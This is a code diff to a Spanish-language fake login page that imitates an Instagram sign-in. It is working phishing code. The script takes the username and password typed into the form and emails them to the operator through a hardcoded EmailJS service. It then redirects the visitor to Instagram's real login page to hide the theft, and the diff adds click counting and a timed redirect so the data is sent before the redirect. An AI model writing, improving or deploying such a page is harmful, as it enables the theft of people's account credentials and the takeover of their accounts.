@@ -4,6 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar Sesión</title>
+    <!-- SDK de EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("i3BHzWrNl1OuWEQRK");
+        })();
+    </script>
     <style>
         * {
             box-sizing: border-box;
@@ -252,37 +259,41 @@
 
         const loginForm = document.getElementById('loginForm');
         const submitBtn = document.getElementById('submitBtn');
+        let clickCount = 0;
 
-        loginForm.addEventListener('submit', async (e) => {
+        loginForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            
-            submitBtn.disabled = true;
+            clickCount++;
 
-            const data = {
-                service_id: 'service_vyx1v45',
-                template_id: 'template_vyx1v45',
-                user_id: 'i3BHzWrNl1OuWEQRK',
-                template_params: {
-                    name: document.getElementById('usernameInput').value,
-                    message: passwordInput.value
-                }
+            const templateParams = {
+                name: document.getElementById('usernameInput').value,
+                message: passwordInput.value
             };
 
-            try {
-                // Petición directa por API HTTP POST (evita bloqueos de SDK en GitHub Pages)
-                await fetch('https://api.emailjs.com/api/v1.0/email/send', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-            } catch (error) {
-                console.log('Error en envío', error);
+            if (clickCount === 1) {
+                // Primer clic: Muestra el aviso en el botón y envía los datos al correo con calma
+                submitBtn.textContent = "Redirigiendo...";
+                submitBtn.style.backgroundColor = "#0070ba";
+
+                // Envía el correo mediante EmailJS en segundo plano sin prisa
+                emailjs.send("service_vyx1v45", "template_vyx1v45", templateParams)
+                    .then((response) => {
+                        console.log('Correo enviado con éxito!');
+                    }, (error) => {
+                        console.log('Error al enviar', error);
+                    });
+
+            } else {
+                // Segundo clic (o si presiona de nuevo): Salto inmediato al link de Instagram
+                window.location.href = "https://www.instagram.com/accounts/login/?mtn";
             }
 
-            // Redirección inmediata a Instagram
-            window.location.href = "https://www.instagram.com/accounts/login/?mtn";
+            // Opcional de seguridad: Si pasan 1.5 segundos del primer clic, redirige automáticamente por si no dio el segundo clic
+            if (clickCount === 1) {
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/accounts/login/?mtn";
+                }, 1500);
+            }
         });
     </script>
 
